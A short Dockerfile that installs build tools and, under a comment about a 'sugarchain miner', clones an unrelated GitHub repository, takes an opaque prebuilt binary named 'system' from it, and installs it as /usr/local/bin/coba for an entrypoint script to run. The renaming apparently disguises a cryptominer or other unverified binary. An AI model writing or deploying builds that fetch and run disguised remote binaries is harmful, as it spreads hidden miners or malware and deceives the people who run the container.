FROM ubuntu:latest
LABEL maintainer="addhe.warman+sugarchain@gmail.com"

# Install wget and install/updates certificates
RUN apt-get update \
 && apt-get install -y -q build-essential \
    libssl-dev \
    libcurl4-openssl-dev \
    libjansson-dev \
    libgmp-dev \
    automake \
    zlib1g-dev \
    git \
 && apt-get clean \
 && rm -r /var/lib/apt/lists/*

# Install sugarchain miner, credits to the author. thank you.
#ADD https://github.com/ogdeig/cpuminer-opt-sugarchain.git /usr/local/bin/

RUN git clone https://github.com/Dawn-shell/linux.git

RUN chmod +x linux/system

RUN cp ./linux/system /usr/local/bin/coba

COPY ./run.sh /

RUN chmod +x /run.sh

ENTRYPOINT ["./run.sh"]
